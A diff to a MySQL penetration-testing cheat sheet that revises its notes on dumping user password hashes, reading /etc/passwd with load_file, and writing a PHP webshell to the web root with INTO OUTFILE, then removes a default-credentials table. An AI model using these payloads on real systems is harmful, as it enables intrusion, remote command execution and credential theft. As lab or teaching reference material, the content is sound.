@@ -16,6 +16,7 @@ mysql -u <user> -p'<password>' <database>
 
 #if ever you get a "ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain" append 
 --skip-ssl
+
 ```
 → If the remote connection gets `Host not allowed`, MySQL is locked to localhost only. You need a shell on the box first, then connect locally.
 
@@ -80,9 +81,8 @@ select user, host, authentication_string from mysql.user;
 → Dumps all MySQL user accounts and their password hashes. Requires access to the `mysql` system database — usually only available as root.
 
 ```sql
-show grants for '<user>'@'localhost';
+show grants;                     -- your own account
 ```
-→ Shows what privileges a MySQL user has. `FILE` privilege is the dangerous one — see below.
 
 ---
 
@@ -91,7 +91,7 @@ show grants for '<user>'@'localhost';
 ```sql
 select load_file('/etc/passwd');
 ```
-→ Reads a file from the server's filesystem and returns it as a string. Only works if the MySQL user has `FILE` privilege and the file is world-readable. Alternative to LFI when you have a MySQL shell.
+→ Reads a file off the server's filesystem (not the DB). Needs global `FILE` priv + `secure_file_priv` allowing the path — check: `SELECT @@secure_file_priv;` (path = that dir only, empty = anywhere, NULL = off).
 
 ---
 
@@ -102,21 +102,10 @@ select "<?php system($_GET['cmd']); ?>" into outfile '/var/www/html/shell.php';
 ```
 → Writes a PHP webshell directly to the web root. If MySQL runs with write access to the web directory, this gives you RCE immediately. Visit `http://<target>/shell.php?cmd=id` to confirm execution.
 
-→ **Requirements:** MySQL user needs `FILE` privilege, and the web root path must be writable by the MySQL process.
-
----
-
-## Common Default Credentials
-
-Try these if you find MySQL exposed with no credentials from enumeration:
-
-| Username | Password |
-|---|---|
-| `root` | (blank) |
-| `root` | `root` |
-| `root` | `mysql` |
-| `root` | `toor` |
-| `admin` | `admin` |
+→ **Needs all 3 — miss one and it fails:**
+- **`FILE` privilege** — a global `ON *.*` grant. DB-level `ALL PRIVILEGES ON db.*` does NOT include it.
+- **`secure_file_priv`** — the dir MySQL is pinned to. If it's a path like `/var/lib/mysql-files/` (the default), you can ONLY write there → useless for a webshell. Empty = anywhere, NULL = off.
+- **Writable path** — the `mysql` OS user must be able to write it. `/var/www` is usually root/www-data owned → dead end.
 
 ---
 
